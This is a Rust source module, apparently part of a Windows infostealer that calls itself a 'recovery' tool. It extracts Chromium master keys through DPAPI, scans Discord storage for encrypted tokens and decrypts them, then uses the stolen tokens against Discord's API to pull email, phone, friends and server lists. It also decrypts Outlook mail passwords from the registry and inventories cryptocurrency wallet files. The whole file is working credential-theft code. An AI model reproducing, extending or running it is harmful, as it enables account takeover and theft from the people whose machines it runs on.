use crate::recovery::browsers::{BrowserName, browser_data_roots};
use crate::recovery::context::RecoveryContext;
use crate::recovery::output::write_json_artifact;
use crate::recovery::registry::format_reg_value;
use crate::recovery::services::wallet_specs;
use crate::recovery::task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask};
use aes_gcm::aead::Aead;
use aes_gcm::{Aes256Gcm, KeyInit, Nonce};
use async_trait::async_trait;
use base64::Engine;
use base64::engine::general_purpose::STANDARD;
use reqwest::header::AUTHORIZATION;
use reqwest::{Client, StatusCode};
use serde::de::DeserializeOwned;
use serde::{Deserialize, Serialize};
use once_cell::sync::Lazy;
use std::collections::HashSet;
use std::ffi::c_void;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use std::time::Duration;
use tokio::fs;
use tokio::io::AsyncReadExt;
use tokio::sync::OnceCell;
use windows::Win32::Foundation::{HLOCAL, LocalFree};
use windows::Win32::Security::Cryptography::{
    CRYPT_INTEGER_BLOB, CRYPTPROTECT_UI_FORBIDDEN, CryptUnprotectData,
};
use winreg::enums::HKEY_CURRENT_USER;
use winreg::{RegKey, RegValue};

fn decode_dpapi_value(encrypted: &[u8]) -> Result<Vec<u8>, RecoveryError> {
    unsafe {
        let mut input = CRYPT_INTEGER_BLOB {
            cbData: encrypted.len() as u32,
            pbData: encrypted.as_ptr() as *mut u8,
        };
        let mut output = CRYPT_INTEGER_BLOB::default();

        let success = CryptUnprotectData(
            &mut input,
            None,
            None,
            None,
            None,
            CRYPTPROTECT_UI_FORBIDDEN,
            &mut output,
        );

        if success.is_err() {
            return Err(RecoveryError::Custom("CryptUnprotectData failed".into()));
        }

        let slice = std::slice::from_raw_parts(output.pbData, output.cbData as usize);
        let result = slice.to_vec();
        if !output.pbData.is_null() {
            let _ = LocalFree(HLOCAL(output.pbData as *mut c_void));
        }

        Ok(result)
    }
}

fn decode_chromium_key(encoded: &str) -> Result<Vec<u8>, RecoveryError> {
    let mut decoded = STANDARD
        .decode(encoded)
        .map_err(|err| RecoveryError::Custom(format!("base64 decode failed: {err}")))?;

    if decoded.starts_with(b"DPAPI") {
        decoded.drain(0..5);
        decode_dpapi_value(&decoded)
    } else {
        Ok(decoded)
    }
}

fn extract_master_key(local_state: &Path) -> Result<Option<Vec<u8>>, RecoveryError> {
    let data = std::fs::read(local_state).map_err(|err| RecoveryError::Io(err))?;
    let json: serde_json::Value =
        serde_json::from_slice(&data).map_err(|err| RecoveryError::Custom(err.to_string()))?;

    let encrypted_key = json
        .get("os_crypt")
        .and_then(|os| os.get("encrypted_key"))
        .and_then(|value| value.as_str());

    if let Some(encrypted) = encrypted_key {
        let master_key = decode_chromium_key(encrypted)?;
        Ok(Some(master_key))
    } else {
        Ok(None)
    }
}

pub fn chromium_secrets_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
    vec![Arc::new(ChromiumSecretsTask::new(ctx))]
}

pub struct ChromiumSecretsTask {
    specs: Vec<(BrowserName, PathBuf)>,
}

impl ChromiumSecretsTask {
    pub fn new(ctx: &RecoveryContext) -> Self {
        Self {
            specs: browser_data_roots(ctx),
        }
    }
}

impl ChromiumSecretsTask {
    async fn gather(&self) -> Vec<ChromiumSecretRecord> {
        let mut records = Vec::new();

        for (browser, root) in &self.specs {
            let local_state = root.join("Local State");
            let mut record = ChromiumSecretRecord {
                browser: browser.label().to_string(),
                local_state: local_state.display().to_string(),
                master_key: None,
                error: None,
            };

            if !local_state.exists() {
                record.error = Some("local state missing".to_string());
            } else {
                match extract_master_key(&local_state) {
                    Ok(Some(key)) => {
                        record.master_key = Some(STANDARD.encode(&key));
                    }
                    Ok(None) => {
                        record.error = Some("encrypted_key missing".to_string());
                    }
                    Err(err) => {
                        record.error = Some(err.to_string());
                    }
                }
            }

            records.push(record);
        }

        records
    }
}

#[async_trait]
impl RecoveryTask for ChromiumSecretsTask {
    fn label(&self) -> String {
        "Chromium Secrets".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Browsers
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let summary = ChromiumSecretSummary {
            secrets: self.gather().await,
        };
        let artifact = write_json_artifact(
            ctx,
            self.category(),
            &self.label(),
            "chromium-secrets.json",
            &summary,
        )
        .await?;

        Ok(vec![artifact])
    }
}

#[derive(Serialize)]
struct ChromiumSecretSummary {
    secrets: Vec<ChromiumSecretRecord>,
}

#[derive(Serialize)]
struct ChromiumSecretRecord {
    browser: String,
    local_state: String,
    master_key: Option<String>,
    error: Option<String>,
}

pub fn discord_token_task(ctx: &RecoveryContext) -> Arc<dyn RecoveryTask> {
    Arc::new(DiscordTokenTask::new(ctx))
}

pub struct DiscordTokenTask {
    roots: Vec<PathBuf>,
}

static DISCORD_TOKEN_CACHE: Lazy<OnceCell<Arc<Vec<DiscordTokenRecord>>>> =
    Lazy::new(OnceCell::new);
static DISCORD_PROFILE_CACHE: Lazy<OnceCell<Arc<Vec<DiscordProfileRecord>>>> =
    Lazy::new(OnceCell::new);

impl DiscordTokenTask {
    pub fn new(ctx: &RecoveryContext) -> Self {
        Self {
            roots: discord_roots(ctx),
        }
    }
}

fn discord_roots(ctx: &RecoveryContext) -> Vec<PathBuf> {
    let mut result = Vec::new();
    let base = ctx.roaming_data_dir.clone();
    for variant in &[
        "discord",
        "discordcanary",
        "Lightcord",
        "discordptb",
        "BetterDiscord",
        "Powercord",
        "replugged",
    ] {
        result.push(base.join(variant));
    }
    result
}

fn decrypt_discord_token(value: &str, master_key: &[u8]) -> Result<String, RecoveryError> {
    let parts: Vec<_> = value.splitn(2, ':').collect();
    if parts.len() != 2 {
        return Err(RecoveryError::Custom("invalid token format".into()));
    }

    let encrypted = STANDARD
        .decode(parts[1])
        .map_err(|err| RecoveryError::Custom(format!("base64 decode failed: {err}")))?;

    if encrypted.len() <= 15 {
        return Err(RecoveryError::Custom("ciphertext too short".into()));
    }

    let nonce = Nonce::from_slice(&encrypted[3..15]);
    let payload = &encrypted[15..];
    let cipher = Aes256Gcm::new_from_slice(master_key)
        .map_err(|err| RecoveryError::Custom(format!("cipher init failed: {err}")))?;
    let decrypted = cipher
        .decrypt(nonce, payload)
        .map_err(|err| RecoveryError::Custom(format!("token decrypt failed: {err}")))?;

    String::from_utf8(decrypted)
        .map_err(|err| RecoveryError::Custom(format!("token utf8 decode failed: {err}")))
}

async fn collect_tokens_for_path(
    root: &Path,
) -> Result<(Option<Vec<u8>>, HashSet<String>), RecoveryError> {
    let local_state = root.join("Local State");
    let master_key = if local_state.exists() {
        extract_master_key(&local_state)?
    } else {
        None
    };

    let leveldb_dir = root.join("Local Storage").join("leveldb");
    let mut tokens = HashSet::new();
    if leveldb_dir.exists() {
        let mut dir = fs::read_dir(&leveldb_dir).await?;
        while let Some(entry) = dir.next_entry().await? {
            let file_type = entry.file_type().await?;
            if !file_type.is_file() {
                continue;
            }

            if let Some(ext) = entry.path().extension().and_then(|s| s.to_str()) {
                if ext != "ldb" && ext != "log" {
                    continue;
                }
            }

            if let Ok(mut found) = scan_leveldb_tokens(&entry.path()).await {
                tokens.extend(found.drain());
            }
        }
    }

    Ok((master_key, tokens))
}

#[derive(Serialize)]
struct DiscordTokenSummary<'a> {
    tokens: &'a [DiscordTokenRecord],
}

#[derive(Serialize)]
struct DiscordTokenRecord {
    source: String,
    raw: String,
    decrypted: Option<String>,
    error: Option<String>,
}

async fn gather_discord_token_records(
    roots: &[PathBuf],
) -> Result<Vec<DiscordTokenRecord>, RecoveryError> {
    let mut records = Vec::new();

    for root in roots {
        let source_label = root.display().to_string();
        match collect_tokens_for_path(root).await {
            Ok((master_key, tokens)) if !tokens.is_empty() => {
                for token in tokens {
                    let decrypted = master_key
                        .as_deref()
                        .and_then(|key| decrypt_discord_token(&token, key).ok());

                    records.push(DiscordTokenRecord {
                        source: source_label.clone(),
                        raw: token.clone(),
                        decrypted,
                        error: None,
                    });
                }
            }
            Ok(_) => {}
            Err(err) => {
                records.push(DiscordTokenRecord {
                    source: source_label.clone(),
                    raw: String::new(),
                    decrypted: None,
                    error: Some(err.to_string()),
                });
            }
        }
    }

    Ok(records)
}

async fn scan_leveldb_tokens(path: &Path) -> Result<HashSet<String>, RecoveryError> {
    const PREFIX: &[u8] = b"dQw4w9WgXcQ:";
    const CHUNK_SIZE: usize = 64 * 1024;

    let mut file = fs::File::open(path).await?;
    let mut buffer: Vec<u8> = Vec::with_capacity(CHUNK_SIZE + PREFIX.len());
    let mut chunk = vec![0u8; CHUNK_SIZE];
    let mut tokens = HashSet::new();

    loop {
        let read = file.read(&mut chunk).await?;
        if read == 0 {
            break;
        }
        buffer.extend_from_slice(&chunk[..read]);

        let mut cursor = 0usize;
        let mut keep_from: Option<usize> = None;

        while cursor + PREFIX.len() <= buffer.len() {
            if &buffer[cursor..cursor + PREFIX.len()] == PREFIX {
                let search_start = cursor + PREFIX.len();
                if let Some(rel_end) = buffer[search_start..].iter().position(|&b| b == b'"') {
                    let end = search_start + rel_end;
                    if let Ok(token) = std::str::from_utf8(&buffer[cursor..end]) {
                        tokens.insert(token.to_string());
                    }
                    cursor = end + 1;
                } else {
                    keep_from = Some(cursor);
                    break;
                }
            } else {
                cursor += 1;
            }
        }

        let keep_from = keep_from.unwrap_or_else(|| {
            let keep = PREFIX.len().saturating_sub(1);
            buffer.len().saturating_sub(keep)
        });
        if keep_from > 0 {
            buffer.copy_within(keep_from.., 0);
            buffer.truncate(buffer.len() - keep_from);
        }
    }

    Ok(tokens)
}

async fn cached_discord_tokens(
    roots: &[PathBuf],
) -> Result<Arc<Vec<DiscordTokenRecord>>, RecoveryError> {
    let roots = roots.to_vec();
    let cached = DISCORD_TOKEN_CACHE
        .get_or_try_init(|| async move {
            let records = gather_discord_token_records(&roots).await?;
            Ok::<Arc<Vec<DiscordTokenRecord>>, RecoveryError>(Arc::new(records))
        })
        .await?;
    Ok(Arc::clone(cached))
}

#[async_trait]
impl RecoveryTask for DiscordTokenTask {
    fn label(&self) -> String {
        "Discord Tokens".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Messengers
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {

        let records = cached_discord_tokens(&self.roots).await?;

        let artifact = write_json_artifact(
            ctx,
            self.category(),
            &self.label(),
            "discord-tokens.json",
            &DiscordTokenSummary {
                tokens: records.as_ref(),
            },
        )
        .await?;

        Ok(vec![artifact])
    }
}

pub fn discord_profile_task(ctx: &RecoveryContext) -> Arc<dyn RecoveryTask> {
    Arc::new(DiscordProfileTask::new(ctx))
}

pub struct DiscordProfileTask {
    roots: Vec<PathBuf>,
}

impl DiscordProfileTask {
    pub fn new(ctx: &RecoveryContext) -> Self {
        Self {
            roots: discord_roots(ctx),
        }
    }
}

struct DiscordApiClient {
    client: Client,
}

impl DiscordApiClient {
    fn new() -> Result<Self, RecoveryError> {
        let client = Client::builder()
            .timeout(Duration::from_secs(10))
            .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
            .build()
            .map_err(|err| RecoveryError::Custom(format!("discord client build failed: {err}")))?;
        Ok(Self { client })
    }

    async fn populate_record(&self, record: &mut DiscordProfileRecord) {
        match self
            .request_discord_endpoint::<DiscordUser>(&record.token, "/users/@me")
            .await
        {
            Ok(Some(user)) => record.user = Some(user.into()),
            Ok(None) => record.errors.push("users/@me unauthorized".into()),
            Err(err) => record.errors.push(err),
        }

        match self
            .request_discord_endpoint::<Vec<DiscordRelationship>>(
                &record.token,
                "/users/@me/relationships",
            )
            .await
        {
            Ok(Some(relationships)) => {
                for relationship in relationships {
                    if let Some(user) = relationship.user {
                        let label = format!("{}#{}", user.username, user.discriminator);
                        match relationship.kind {
                            1 => record.friends.push(label),
                            2 => record.blocked_friends.push(label),
                            _ => {}
                        }
                    }
                }
            }
            Ok(None) => record
                .errors
                .push("relationship endpoint unauthorized".into()),
            Err(err) => record.errors.push(err),
        }

        match self
            .request_discord_endpoint::<Vec<DiscordGuild>>(&record.token, "/users/@me/guilds")
            .await
        {
            Ok(Some(guilds)) => {
                for guild in guilds {
                    let summary = DiscordGuildSummary::from(guild);
                    if summary.owner {
                        record.owned_servers.push(summary);
                    } else {
                        record.other_servers.push(summary);
                    }
                }
            }
            Ok(None) => record.errors.push("guild endpoint unauthorized".into()),
            Err(err) => record.errors.push(err),
        }
    }

    async fn request_discord_endpoint<T>(
        &self,
        token: &str,
        endpoint: &str,
    ) -> Result<Option<T>, String>
    where
        T: DeserializeOwned,
    {
        let url = format!("https://discord.com/api/v10{endpoint}");
        let response = self
            .client
            .get(&url)
            .header(AUTHORIZATION, token)
            .send()
            .await
            .map_err(|err| format!("{endpoint} request failed: {err}"))?;
        match response.status() {
            StatusCode::OK => response
                .json::<T>()
                .await
                .map(Some)
                .map_err(|err| format!("{endpoint} parse failed: {err}")),
            StatusCode::UNAUTHORIZED => Ok(None),
            status => Err(format!("{endpoint} returned {status}")),
        }
    }
}

async fn collect_discord_profiles_inner(
    roots: &[PathBuf],
    api: &DiscordApiClient,
) -> Result<Vec<DiscordProfileRecord>, RecoveryError> {
    let mut profiles = Vec::new();
    let mut seen = HashSet::new();
    let tokens = cached_discord_tokens(roots).await?;
    for record in tokens
        .iter()
        .filter_map(|rec| rec.decrypted.as_ref().map(|token| (rec.source.clone(), token.clone())))
    {
        let (source, token) = record;
        if !seen.insert(token.clone()) {
            continue;
        }

        let mut profile = DiscordProfileRecord::new(source, token);
        api.populate_record(&mut profile).await;
        profiles.push(profile);
    }

    Ok(profiles)
}

async fn cached_discord_profiles(
    roots: &[PathBuf],
) -> Result<Arc<Vec<DiscordProfileRecord>>, RecoveryError> {
    let roots = roots.to_vec();
    let cached = DISCORD_PROFILE_CACHE
        .get_or_try_init(|| async move {
            let api = DiscordApiClient::new()?;
            let profiles = collect_discord_profiles_inner(&roots, &api).await?;
            Ok::<Arc<Vec<DiscordProfileRecord>>, RecoveryError>(Arc::new(profiles))
        })
        .await?;
    Ok(Arc::clone(cached))
}

#[derive(Serialize)]
struct DiscordProfileSummary<'a> {
    profiles: &'a [DiscordProfileRecord],
}

#[derive(Serialize)]
struct DiscordProfileRecord {
    source: String,
    token: String,
    user: Option<DiscordUserSummary>,
    friends: Vec<String>,
    blocked_friends: Vec<String>,
    owned_servers: Vec<DiscordGuildSummary>,
    other_servers: Vec<DiscordGuildSummary>,
    errors: Vec<String>,
}

impl DiscordProfileRecord {
    fn new(source: String, token: String) -> Self {
        Self {
            source,
            token,
            user: None,
            friends: Vec::new(),
            blocked_friends: Vec::new(),
            owned_servers: Vec::new(),
            other_servers: Vec::new(),
            errors: Vec::new(),
        }
    }
}

#[derive(Deserialize)]
struct DiscordUser {
    id: String,
    username: String,
    #[serde(rename = "global_name")]
    global_name: Option<String>,
    clan: Option<String>,
    #[serde(rename = "mfa_enabled")]
    mfa_enabled: Option<bool>,
    locale: Option<String>,
    email: Option<String>,
    verified: Option<bool>,
    phone: Option<String>,
    bio: Option<String>,
}

#[derive(Serialize)]
struct DiscordUserSummary {
    id: String,
    username: String,
    global_name: Option<String>,
    clan: Option<String>,
    mfa_enabled: Option<bool>,
    locale: Option<String>,
    email: Option<String>,
    verified: Option<bool>,
    phone: Option<String>,
    bio: Option<String>,
}

impl From<DiscordUser> for DiscordUserSummary {
    fn from(source: DiscordUser) -> Self {
        Self {
            id: source.id,
            username: source.username,
            global_name: source.global_name,
            clan: source.clan,
            mfa_enabled: source.mfa_enabled,
            locale: source.locale,
            email: source.email,
            verified: source.verified,
            phone: source.phone,
            bio: source.bio,
        }
    }
}

#[derive(Deserialize)]
struct DiscordRelationship {
    #[serde(rename = "type")]
    kind: i32,
    user: Option<DiscordRelationshipUser>,
}

#[derive(Deserialize)]
struct DiscordRelationshipUser {
    #[serde(rename = "id")]
    _id: String,
    username: String,
    discriminator: String,
}

#[derive(Deserialize)]
struct DiscordGuild {
    id: String,
    name: String,
    owner: bool,
    permissions: Option<String>,
    features: Option<Vec<String>>,
}

#[derive(Serialize)]
struct DiscordGuildSummary {
    id: String,
    name: String,
    owner: bool,
    permissions: Option<String>,
    discoverable: bool,
    vanity_url: bool,
}

impl From<DiscordGuild> for DiscordGuildSummary {
    fn from(source: DiscordGuild) -> Self {
        let mut discoverable = false;
        let mut vanity_url = false;
        if let Some(features) = source.features.as_ref() {
            for feature in features {
                if feature.eq_ignore_ascii_case("discoverable") {
                    discoverable = true;
                } else if feature.eq_ignore_ascii_case("vanity_url") {
                    vanity_url = true;
                }
                if discoverable && vanity_url {
                    break;
                }
            }
        }
        Self {
            id: source.id,
            name: source.name,
            owner: source.owner,
            permissions: source.permissions,
            discoverable,
            vanity_url,
        }
    }
}

#[async_trait]
impl RecoveryTask for DiscordProfileTask {
    fn label(&self) -> String {
        "Discord Profiles".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Messengers
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let profiles = cached_discord_profiles(&self.roots).await?;

        let artifact = write_json_artifact(
            ctx,
            self.category(),
            &self.label(),
            "discord-profiles.json",
            &DiscordProfileSummary {
                profiles: profiles.as_ref(),
            },
        )
        .await?;

        Ok(vec![artifact])
    }
}

pub fn discord_service_task(ctx: &RecoveryContext) -> Arc<dyn RecoveryTask> {
    Arc::new(DiscordServiceTask::new(ctx))
}

struct DiscordServiceTask {
    roots: Vec<PathBuf>,
}

impl DiscordServiceTask {
    fn new(ctx: &RecoveryContext) -> Self {
        Self {
            roots: discord_roots(ctx),
        }
    }
}

#[async_trait]
impl RecoveryTask for DiscordServiceTask {
    fn label(&self) -> String {
        "Discord Service Helper".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Messengers
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let profiles = cached_discord_profiles(&self.roots).await?;

        let mut user_builder = String::new();
        let mut friends_builder = format!("Friends:\n====================\n\n");
        let mut blocked_builder = format!("Blocked Friends:\n====================\n\n");
        let mut owned_builder = format!("Owned Servers:\n====================\n\n");
        let mut other_builder = format!("Other Servers:\n====================\n\n");

        if profiles.is_empty() {
            user_builder.push_str("No Discord profiles recovered.\n");
            friends_builder.push_str("No friends recovered.\n\n");
            blocked_builder.push_str("No blocked friends recovered.\n\n");
            owned_builder.push_str("No owned servers recovered.\n\n");
            other_builder.push_str("No other servers recovered.\n\n");
        } else {
            for profile in profiles.iter() {
                let user = profile.user.as_ref();
                let display_name = user
                    .and_then(|u| u.global_name.as_deref())
                    .unwrap_or_default();
                let username = user.map(|u| u.username.as_str()).unwrap_or_default();
                let user_id = user.map(|u| u.id.as_str()).unwrap_or_default();
                let email = user.and_then(|u| u.email.as_deref()).unwrap_or_default();
                let phone = user.and_then(|u| u.phone.as_deref()).unwrap_or_default();
                let clan = user.and_then(|u| u.clan.as_deref()).unwrap_or("None");
                let mfa = user.and_then(|u| u.mfa_enabled).unwrap_or(false);
                let verified = user.and_then(|u| u.verified).unwrap_or(false);
                let locale = user.and_then(|u| u.locale.as_deref()).unwrap_or_default();
                let bio = user.and_then(|u| u.bio.as_deref()).unwrap_or_default();

                user_builder.push_str(&format!(
                    "Display Name: {}\nUsername: {} ({})\nEmail: {}\nPhone: {}\nToken: {}\nClan: {}\nMFA Enabled: {}\nVerified: {}\nLocale: {}\nBio:\n{}\n\n",
                    display_name,
                    username,
                    user_id,
                    email,
                    phone,
                    profile.token,
                    clan,
                    mfa,
                    verified,
                    locale,
                    bio,
                ));

                if !profile.errors.is_empty() {
                    user_builder.push_str("Errors:\n");
                    for error in &profile.errors {
                        user_builder.push_str(error);
                        user_builder.push('\n');
                    }
                    user_builder.push('\n');
                }

                for friend in &profile.friends {
                    friends_builder.push_str(friend);
                    friends_builder.push('\n');
                }
                friends_builder.push('\n');

                for blocked in &profile.blocked_friends {
                    blocked_builder.push_str(blocked);
                    blocked_builder.push('\n');
                }
                blocked_builder.push('\n');

                for guild in &profile.owned_servers {
                    owned_builder.push_str(&format!(
                        "Name: {} ({})\nPermissions: {}\nDiscoverable: {}\nCustom Link: {}\n\n",
                        guild.name,
                        guild.id,
                        guild.permissions.as_deref().unwrap_or_default(),
                        guild.discoverable,
                        guild.vanity_url,
                    ));
                }
                owned_builder.push('\n');

                for guild in &profile.other_servers {
                    other_builder.push_str(&format!(
                        "Name: {} ({})\nPermissions: {}\nDiscoverable: {}\nCustom Link: {}\n\n",
                        guild.name,
                        guild.id,
                        guild.permissions.as_deref().unwrap_or_default(),
                        guild.discoverable,
                        guild.vanity_url,
                    ));
                }
                other_builder.push('\n');
            }
        }

        let mut relations_combined = String::new();
        relations_combined.push_str(&friends_builder);
        relations_combined.push_str(&blocked_builder);

        let mut servers_combined = String::new();
        servers_combined.push_str(&owned_builder);
        servers_combined.push_str(&other_builder);

        let mut artifacts = Vec::new();
        artifacts.push(
            write_discord_text_artifact(ctx, &self.label(), "Basic.txt", &user_builder).await?,
        );
        artifacts.push(
            write_discord_text_artifact(ctx, &self.label(), "Relations.txt", &relations_combined)
                .await?,
        );
        artifacts.push(
            write_discord_text_artifact(ctx, &self.label(), "Servers.txt", &servers_combined)
                .await?,
        );

        Ok(artifacts)
    }
}

async fn write_discord_text_artifact(
    ctx: &RecoveryContext,
    label: &str,
    file_name: &str,
    contents: &str,
) -> Result<RecoveryArtifact, RecoveryError> {
    let folder = ctx
        .output_dir
        .join("services")
        .join("Messengers")
        .join("Discord");
    fs::create_dir_all(&folder).await?;

    let target = folder.join(file_name);
    fs::write(&target, contents).await?;
    let meta = fs::metadata(&target).await?;
    Ok(RecoveryArtifact {
        label: label.to_string(),
        path: target,
        size_bytes: meta.len(),
        modified: meta.modified().ok(),
    })
}

pub fn outlook_registry_task() -> Arc<dyn RecoveryTask> {
    Arc::new(OutlookRegistryTask)
}

pub struct OutlookRegistryTask;

impl OutlookRegistryTask {
    fn collect_entries() -> Vec<RegistryEntry> {
        const OUTLOOK_PATHS: &[&str] = &[
            r"Software\Microsoft\Office\15.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676",
            r"Software\Microsoft\Office\16.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676",
            r"Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676",
            r"Software\Microsoft\Windows Messaging Subsystem\Profiles\9375CFF0413111d3B88A00104B2A6676",
        ];

        const MAIL_CLIENTS: &[&str] = &[
            "SMTP Email Address",
            "SMTP Server",
            "POP3 Server",
            "POP3 User Name",
            "SMTP User Name",
            "NNTP Email Address",
            "NNTP User Name",
            "NNTP Server",
            "IMAP Server",
            "IMAP User Name",
            "Email",
            "HTTP User",
            "HTTP Server URL",
            "POP3 User",
            "IMAP User",
            "HTTPMail User Name",
            "HTTPMail Server",
            "SMTP User",
            "POP3 Password2",
            "IMAP Password2",
            "NNTP Password2",
            "HTTPMail Password2",
            "SMTP Password2",
            "POP3 Password",
            "IMAP Password",
            "NNTP Password",
            "HTTPMail Password",
            "SMTP Password",
        ];

        let hive = RegKey::predef(HKEY_CURRENT_USER);
        let mut entries = Vec::new();

        for path in OUTLOOK_PATHS {
            if let Ok(key) = hive.open_subkey(path) {
                OutlookRegistryTask::walk_registry(&key, path, MAIL_CLIENTS, &mut entries);
            }
        }

        entries
    }

    fn walk_registry(key: &RegKey, path: &str, names: &[&str], entries: &mut Vec<RegistryEntry>) {
        for name in names {
            if let Ok(value) = key.get_raw_value(name) {
                entries.push(RegistryEntry {
                    path: path.to_string(),
                    name: name.to_string(),
                    value: format_outlook_registry_value(name, &value),
                });
            }
        }

        let mut iter = key.enum_keys();
        while let Some(Ok(sub_name)) = iter.next() {
            if let Ok(child) = key.open_subkey(&sub_name) {
                let child_path = format!(r"{path}\{sub_name}");
                OutlookRegistryTask::walk_registry(&child, &child_path, names, entries);
            }
        }
    }
}

fn format_outlook_registry_value(name: &str, value: &RegValue) -> String {
    if name.contains("Password") && !name.contains('2') {
        if let Ok(decrypted) = decode_dpapi_value(&value.bytes) {
            if let Ok(text) = String::from_utf8(decrypted) {
                let trimmed = text.trim_end_matches('\0').to_string();
                if !trimmed.is_empty() {
                    return trimmed;
                }
            }
        }
    }
    format_reg_value(value)
}

#[derive(Serialize)]
struct RegistryEntry {
    path: String,
    name: String,
    value: String,
}

#[async_trait]
impl RecoveryTask for OutlookRegistryTask {
    fn label(&self) -> String {
        "Outlook Registry".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::EmailClients
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let summary = OutlookRegistrySummary {
            entries: OutlookRegistryTask::collect_entries(),
        };
        let artifact = write_json_artifact(
            ctx,
            self.category(),
            &self.label(),
            "outlook-registry.json",
            &summary,
        )
        .await?;

        Ok(vec![artifact])
    }
}

#[derive(Serialize)]
struct OutlookRegistrySummary {
    entries: Vec<RegistryEntry>,
}

pub fn wallet_inventory_task(ctx: &RecoveryContext) -> Arc<dyn RecoveryTask> {
    Arc::new(WalletInventoryTask::new(ctx))
}

pub struct WalletInventoryTask {
    specs: Vec<WalletSummarySpec>,
}

struct WalletSummarySpec {
    label: &'static str,
    sources: Vec<PathBuf>,
    sample_limit: usize,
}

impl WalletInventoryTask {
    pub fn new(ctx: &RecoveryContext) -> Self {
        let specs = wallet_specs(ctx)
            .into_iter()
            .map(|(label, sources, _, _)| WalletSummarySpec {
                label,
                sources,
                sample_limit: 64,
            })
            .collect();
        Self { specs }
    }
}

#[derive(Serialize)]
struct WalletInventorySummary {
    inventories: Vec<WalletInventoryRecord>,
}

#[derive(Serialize)]
struct WalletInventoryRecord {
    label: String,
    roots: Vec<String>,
    exists: bool,
    file_count: usize,
    total_bytes: u64,
    samples: Vec<WalletFile>,
}

#[derive(Serialize)]
struct WalletFile {
    relative: String,
    size: u64,
}

async fn collect_wallet_files(
    root: &Path,
    limit: usize,
) -> Result<(Vec<WalletFile>, usize, u64), RecoveryError> {
    let mut stack = vec![root.to_path_buf()];
    let mut samples = Vec::new();
    let mut count = 0;
    let mut total_bytes = 0;

    while let Some(path) = stack.pop() {
        let mut dir = match fs::read_dir(&path).await {
            Ok(dir) => dir,
            Err(err) => return Err(RecoveryError::Io(err)),
        };

        while let Some(entry) = dir.next_entry().await? {
            let metadata = entry.metadata().await?;
            if metadata.is_dir() {
                stack.push(entry.path());
            } else if metadata.is_file() {
                count += 1;
                total_bytes += metadata.len();
                if samples.len() < limit {
                    let relative = entry
                        .path()
                        .strip_prefix(root)
                        .map(|p| p.display().to_string())
                        .unwrap_or_else(|_| entry.path().display().to_string());
                    samples.push(WalletFile {
                        relative,
                        size: metadata.len(),
                    });
                }
            }
        }
    }

    Ok((samples, count, total_bytes))
}

#[async_trait]
impl RecoveryTask for WalletInventoryTask {
    fn label(&self) -> String {
        "Wallet Inventory".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Wallets
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut inventories = Vec::new();

        for spec in &self.specs {
            let mut record = WalletInventoryRecord {
                label: spec.label.to_string(),
                roots: spec
                    .sources
                    .iter()
                    .map(|path| path.display().to_string())
                    .collect(),
                exists: false,
                file_count: 0,
                total_bytes: 0,
                samples: Vec::new(),
            };

            for root in &spec.sources {
                if !root.exists() {
                    continue;
                }

                record.exists = true;
                if let Ok((samples, count, bytes)) =
                    collect_wallet_files(root, spec.sample_limit).await
                {
                    record.samples.extend(samples);
                    record.file_count += count;
                    record.total_bytes += bytes;
                }
            }

            inventories.push(record);
        }

        let artifact = write_json_artifact(
            ctx,
            self.category(),
            &self.label(),
            "wallet-inventory.json",
            &WalletInventorySummary { inventories },
        )
        .await?;

        Ok(vec![artifact])
    }
}
